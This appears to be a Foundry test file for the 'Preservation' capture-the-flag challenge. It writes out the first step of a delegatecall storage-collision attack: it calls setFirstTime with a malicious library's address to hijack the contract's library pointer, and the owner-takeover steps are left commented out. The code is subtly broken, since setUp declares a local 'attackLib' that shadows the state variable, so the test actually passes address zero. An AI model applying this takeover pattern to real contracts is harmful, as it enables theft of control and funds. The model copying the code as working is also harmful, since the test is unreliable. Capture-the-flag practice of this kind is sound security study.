// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import "../src/Preservation.sol";

contract PreservationTest is Test {
    Preservation public preservation;
    LibraryContract public lib1;
    LibraryContract public lib2;
    MaliciousLibraryContract public attackLib;

    function setUp() public {
        lib1 = new LibraryContract();
        lib2 = new LibraryContract();
        preservation = new Preservation(address(lib1), address(lib2));
        MaliciousLibraryContract attackLib = new MaliciousLibraryContract();
        console2.log(preservation.timeZone2Library());
        assertTrue(preservation.timeZone2Library() == address(lib2));
    }

    function testAttack() public {
        preservation.setFirstTime(uint256(uint160(address(attackLib))));
        // assertEq(preservation.timeZone2Library(), address(lib2));
        // assertEq(preservation.timeZone1Library(), address(attackLib), "Should set lib to malicous contract");
        // preservation.setFirstTime(uint256(uint160(address(this))));
        // assertEq(preservation.owner(), address(this), "Should set owner to attacker");
    }
}
